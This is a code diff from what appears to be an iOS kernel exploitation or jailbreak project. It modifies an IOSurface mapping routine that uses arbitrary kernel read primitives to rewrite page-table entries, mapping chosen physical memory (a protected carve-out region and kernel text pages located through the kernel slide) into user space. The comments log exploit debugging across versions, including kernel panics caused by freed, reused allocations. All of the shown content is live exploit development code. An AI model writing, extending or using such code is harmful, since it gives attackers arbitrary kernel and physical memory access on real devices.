@@ -344,6 +344,23 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 				*uaddr = NULL;
 				return -1;
 			}
+			// v103: HEADER VALIDATION before any table access (panic
+			// 14:58:16 decode: a post-drain alias read landed in a
+			// kalloc.48 element — the previous table page was freed on its
+			// surface's unwire and partially reused; our walk crossed into
+			// it). v100 ground truth: live tables carry q5 = 0xc040_00001000
+			// (flags 0xc040 high, length 0x1000 low). Mismatch = stale/freed
+			// page → abort the window, no reads, no writes.
+			{
+				uint64_t hdr = kread64(aq2 + 8 * 5);
+				jb_tr_beacon("KMAP q2hdr=%llx", (unsigned long long)hdr);
+				if ((hdr >> 32) != 0xc040ULL || (hdr & 0xFFFFFFFFULL) != 0x1000ULL) {
+					jb_tr_beacon("KMAP fail,q2,stale,hdr=%llx",
+					             (unsigned long long)hdr);
+					*uaddr = NULL;
+					return -1;
+				}
+			}
 
 			// Drain to 0 FIRST (unwire — the re-wire will rebuild, and our
 			// rewrite lands after the drain so it survives as the input).
@@ -366,7 +383,31 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 			// 0x10101d4000). v101 wrote pa>>12 = 4x the correct pagenum,
 			// aiming the backing at PA/4 (unmapped) → C,first=0,0 was the
 			// bug, not a rebuild fight. pagenum = pa >> 14.
-			uint64_t pagenum = (pa & ~0x3FFFULL) >> 14;
+			// v103 CONTROL LADDER (v102 verdict: shift fix correct —
+			// entries decoded to the exact carve-out PA — but 9 windows
+			// of C,first=0,0. Ambiguous: hole-reads-zero vs rewrite
+			// ignored. Discriminate with a KNOWN-CONTENT control: seq%3
+			//   0: carve-out PA (the hunt)
+			//   1: kernel text page (kbase from DONE beacon — C,first must
+			//      show Mach-O magic 0xfeedfacf if the rewrite path works)
+			//   2: carve-out PA (hunt)
+			// kbase is beaconed by ClearSword before Titan runs; stash it
+			// from the krw layer.
+			uint64_t pagenum;
+			// kbase: available in-process as kconstant(base) (info.c:654 —
+			// ClearSword sets kernelConstant.slide at WIN, libjailbreak
+			// derives base). seq%3 ladder:
+			//   0: carve-out PA (the hunt)
+			//   1: kernel text page — C,first must show Mach-O magic
+			//      0xfeedfacf if the rewrite path works end-to-end
+			//   2: carve-out PA (the hunt)
+			{
+				uint64_t kbase = kconstant(base);
+				if ((seq % 3) == 1 && kbase && kbase != kconstant(staticBase))
+					pagenum = (kbase & ~0x3FFFULL) >> 14;
+				else
+					pagenum = (pa & ~0x3FFFULL) >> 14;
+			}
 			for (int qi = 6; qi < 16; qi++) {
 				snap[qi] = kread64(aq2 + 8 * qi);
 				if (seq == 0)
